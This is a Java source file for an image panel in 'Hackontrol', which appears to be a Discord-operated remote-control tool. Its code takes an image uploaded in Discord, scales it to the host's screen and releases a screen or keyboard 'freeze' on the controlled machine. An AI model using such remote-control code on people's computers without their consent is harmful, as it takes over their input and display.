package com.khopan.hackontrol.panel;

import java.awt.Dimension;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.util.List;

import javax.imageio.ImageIO;

import com.khopan.hackontrol.KeyboardHandler;
import com.khopan.hackontrol.library.Kernel;
import com.khopan.hackontrol.registry.Registration;
import com.khopan.hackontrol.service.interaction.ButtonManager;
import com.khopan.hackontrol.service.interaction.ButtonManager.ButtonType;
import com.khopan.hackontrol.service.interaction.InteractionManager;
import com.khopan.hackontrol.utils.HackontrolError;
import com.khopan.hackontrol.utils.HackontrolMessage;
import com.khopan.hackontrol.utils.ImageTransform;
import com.khopan.hackontrol.utils.interaction.HackontrolButton;
import com.khopan.hackontrol.utils.sendable.sender.MessageChannelSendable;

import net.dv8tion.jda.api.entities.Message.Attachment;
import net.dv8tion.jda.api.entities.channel.unions.MessageChannelUnion;
import net.dv8tion.jda.api.interactions.components.buttons.Button;
import net.dv8tion.jda.api.utils.FileUpload;

public class ImagePanel extends Panel {
	private static final String PANEL_NAME = "image";

	private static final Button BUTTON_UPLOAD = ButtonManager.staticButton(ButtonType.SUCCESS, "Upload", "imageUpload");
	private static final Button BUTTON_CLOSE  = ButtonManager.staticButton(ButtonType.DANGER,  "Close",  "imageClose");

	private boolean uploading;
	private long uploadMessage;

	@Override
	public String panelName() {
		return ImagePanel.PANEL_NAME;
	}

	@Override
	public void registeration() {
		this.register(Registration.BUTTON, ImagePanel.BUTTON_UPLOAD, context -> {
			if(!this.uploading) {
				this.uploadMessage = context.reply("**Waiting for an image...**").complete().retrieveOriginal().complete().getIdLong();
				this.uploading = true;
				return;
			}

			this.uploading = false;
			context.getChannel().deleteMessageById(this.uploadMessage).queue();
			HackontrolMessage.boldDeletable(context.reply(), "Uploading canceled");
		});

		this.register(Registration.BUTTON, ImagePanel.BUTTON_CLOSE,  context -> {
			if(!KeyboardHandler.Freeze) {
				HackontrolMessage.boldDeletable(context.reply(), "The image is already closed");
				return;
			}

			Kernel.setFreeze(KeyboardHandler.Freeze = false, null);
			context.deferEdit().queue();
		});

		this.register(Registration.MESSAGE_RECEIVED_EVENT, Event -> {
			if(Event.getAuthor().isBot()) {
				return;
			}

			MessageChannelUnion channel = Event.getChannel();

			if(channel.getIdLong() != this.channel.getIdLong()) {
				return;
			}

			List<Attachment> attachmentList = Event.getMessage().getAttachments();

			if(attachmentList.isEmpty()) {
				return;
			}

			channel.deleteMessageById(this.uploadMessage).queue();
			BufferedImage input;

			try {
				input = ImageIO.read(attachmentList.get(0).getProxy().download().join());
			} catch(Throwable Errors) {
				HackontrolError.throwable(MessageChannelSendable.of(this.channel), Errors);
				return;
			}

			FileUpload upload;

			try {
				ByteArrayOutputStream stream = new ByteArrayOutputStream();
				Dimension size = Toolkit.getDefaultToolkit().getScreenSize();
				ImageIO.write(ImageTransform.transform(input, size.width, size.height), "png", stream);
				upload = FileUpload.fromData(stream.toByteArray(), "image.png");
			} catch(Throwable Errors) {
				HackontrolError.throwable(MessageChannelSendable.of(this.channel), Errors);
				return;
			}

			Event.getMessage().delete().queue();
			this.channel.sendFiles(upload).addActionRow(ImagePanel.BUTTON_CLOSE, HackontrolButton.delete()).queue(InteractionManager :: callback);
		});
	}

	@Override
	public ControlWidget[] controlWidget() {
		return new ControlWidget[] {
				ControlWidget.newBuilder()
				.actionRow(ImagePanel.BUTTON_UPLOAD)
				.build()
		};
	}
}
